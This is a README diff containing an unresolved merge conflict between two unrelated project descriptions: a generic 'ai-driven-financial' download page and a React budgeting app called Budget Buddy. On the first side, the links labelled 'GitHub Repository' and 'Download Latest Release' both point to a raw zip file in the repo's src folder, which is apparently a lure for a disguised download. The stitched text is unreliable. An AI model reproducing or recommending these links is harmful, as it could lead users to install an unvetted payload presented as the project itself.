@@ -69,9 +69,104 @@ This application utilizes popular technologies such as:
 ## 📞 Feedback
 Your thoughts are important to us. If you have suggestions or feedback, please let us know! You can submit your ideas and comments via the Issues tab in this repository.
 
+<<<<<<< HEAD
 ## 💡 Conclusion
 With **ai-driven-financial**, you have a powerful and effective tool at your fingertips. Follow these simple steps to download and start optimizing your finance strategies today. You’re just a few clicks away from real-time insights! Enjoy exploring your financial data like never before.
 
 ## 🔗 Useful Links
 - **GitHub Repository:** [ai-driven-financial](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
 - **Download Latest Release:** [Download Here](https://raw.githubusercontent.com/Garnel-Diffo/ai-driven-financial/main/src/financial-ai-driven-quintin.zip)
+=======
+```bash
+npm run build
+```
+
+### Run Tests
+
+```bash
+npm run test
+```
+
+Project tests live under the `tests/` directory.
+
+
+## 📱 Usage
+
+1. **Getting Started**
+   - Visit the [live demo](https://budget-buddy-beta-version.onrender.com/)
+   - Create your financial profile
+   - Add your current balance and assets
+
+2. **Adding Financial Data**
+   - Navigate to the balance section to input your current funds
+   - Use the asset tracker to record your valuable possessions
+   - Set income goals to track your financial objectives
+
+3. **AI Insights**
+   - View personalized recommendations based on your financial data
+   - Get insights on spending patterns and saving opportunities
+
+## 🎯 Roadmap
+
+### Phase 1 (Current - Beta)
+- [x] Basic balance tracking
+- [x] Net worth calculation
+- [x] Asset management
+- [x] Income goal setting
+
+### Phase 2 (Next Release)
+- [ ] Expense tracking and categorization
+- [ ] Budget creation tools
+- [ ] Financial goal tracking
+- [ ] Enhanced AI recommendations
+
+### Phase 3 (Future)
+- [ ] Bank integration
+- [ ] Investment tracking
+- [ ] Advanced analytics
+- [ ] Mobile app
+
+## 🤝 Contributing
+
+This project is currently in beta and under active development. Contributions are welcome!
+
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
+4. Push to the branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+## 📝 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## 📞 Contact & Support
+
+- **Live Demo:** [https://budget-buddy-beta-version.onrender.com/](https://budget-buddy-beta-version.onrender.com/)
+- **Issues:** Please report bugs and request features through GitHub Issues
+- **Developer:** [Nasim Rana Feroz]
+- **Email:** feroznasimrana@gmail.com
+
+## ⚠️ Beta Disclaimer
+
+This is a beta version of Budget Buddy. While fully functional, you may experience:
+- Occasional bugs or unexpected behavior
+- Features that are still being refined
+- Regular updates that may change the interface
+
+Known intentional gaps in this beta:
+- Limited error handling in some async flows
+- Placeholder views for upcoming features
+- Repeated UI implementations in a few components while patterns are being consolidated
+
+I appreciate your feedback  as I continue to improve the platform!
+
+## 🙏 Acknowledgments
+
+- Built with love using React and Tailwind CSS
+- Deployed on Render for seamless hosting
+
+---
+
+**Made with ❤️ for better financial management**
+>>>>>>> fec9c25
